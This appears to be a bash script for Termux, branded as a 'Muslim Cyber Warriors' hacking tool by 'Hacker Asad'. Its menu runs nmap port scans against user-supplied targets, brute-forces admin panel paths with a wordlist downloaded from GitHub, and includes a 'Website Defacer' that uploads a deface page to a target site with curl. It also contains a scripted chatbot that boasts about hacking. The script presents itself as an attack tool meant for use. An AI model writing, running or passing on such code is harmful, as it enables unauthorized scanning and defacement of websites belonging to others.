#!/data/data/com.termux/files/usr/bin/bash

clear
echo "LOADING MCW TOOL..." | pv -qL 15 | lolcat
figlet "HACKER ASAD" | lolcat
echo "💀 SYSTEM BREACHED - MCW LEGION ACTIVE 💀" | lolcat
sleep 1

echo
echo "===============================" | lolcat
echo "⚡ Tool Created By: HACKER ASAD" | lolcat
echo "⚔️  MCW - Muslim Cyber Warriors" | lolcat
echo "===============================" | lolcat
echo

PS3=$'\e[1;32mSelect Option: \e[0m'
options=("Port Scanner" "IP Tracker" "Admin Panel Finder" "Website Defacer" "AI Chill Mode" "Exit")
select opt in "${options[@]}"
do
    case $opt in
        "Port Scanner")
            echo -e "\nEnter Target IP or Domain:" | lolcat
            read target
            echo -e "\n[⚡] Scanning ports on $target..." | lolcat
            nmap $target
            ;;

        "IP Tracker")
            echo -e "\nEnter IP Address:" | lolcat
            read ip
            curl -s http://ip-api.com/json/$ip | jq
            ;;

        "Admin Panel Finder")
            echo -e "\nEnter Website URL (without https://):" | lolcat
            read website
            echo -e "\n[🔍] Scanning $website for admin panels..." | lolcat
            curl -s https://raw.githubusercontent.com/bhikandeshmukh/Admin-Panel-Finder/master/admin-panel.txt -o admin-paths.txt
            for path in $(cat admin-paths.txt); do
                response=$(curl -s -o /dev/null -w "%{http_code}" http://$website/$path)
                if [ "$response" == "200" ]; then
                    echo "[✅] Found: http://$website/$path" | lolcat
                fi
            done
            ;;

        "Website Defacer")
            echo -e "\nEnter target website URL (with http:// or https://):" | lolcat
            read target
            echo -e "\n[💣] Uploading deface page to $target..." | lolcat
            curl -T deface.html $target
            echo -e "\n[✅] Deface attempt sent to $target/deface.html" | lolcat
            ;;

        "AI Chill Mode")
            echo -e "\n[💬] Starting MCW ChillBot (Offline AI)..." | lolcat
            while true; do
                echo -ne "\n🧠 You: " | lolcat
                read input
                case $input in
                    hi|hello)
                        echo "🤖 Salaam, Hacker Asad!" | lolcat ;;
                    whoami)
                        echo "🤖 You are the legendary Hacker Asad, leader of MCW!" | lolcat ;;
                    "how are you"|"how are you bro")
                        echo "🤖 I'm good bro, scanning the dark web 😎" | lolcat ;;
                    "what is your name")
                        echo "🤖 I'm MCW ChillBot, your loyal AI assistant." | lolcat ;;
                    "what is hacking")
                        echo "🤖 Hacking is the art of exploiting systems 💻💣" | lolcat ;;
                    "what is mcw"|"mcw meaning")
                        echo "🤖 MCW means MUSLIM CYBER WARRIORS — created by Hacker Asad." | lolcat ;;
                    "what is pakistan")
                        echo "🤖 Pakistan is a very powerful country. I like Pakistan. Do you like Pakistan?" | lolcat ;;
                    "who created pakistan")
                        echo "🤖 First created by ALLAH, then with the help of QUAID-E-AZAM. He gave us freedom on 14th August 1947." | lolcat ;;
                    "who is hacker asad")
                        echo "🤖 Hacker Asad created me. He is a very powerful hacker." | lolcat ;;
                    "where does hacker asad live")
                        echo "🤖 Hacker Asad lives in the dark web and the dark world. 🌑" | lolcat ;;
                    exit|bye)
                        echo "🤖 Bye bro! Stay safe and stay elite 🔐" | lolcat
                        break ;;
                    *)
                        echo "🤖 Sorry bro, I don't know that yet 😅" | lolcat ;;
                esac
            done
            ;;

        "Exit")
            echo -e "\n[!] Exiting MCW Tool..." | lolcat
            break
            ;;

        *) echo "Invalid option 😡" ;;
    esac
done
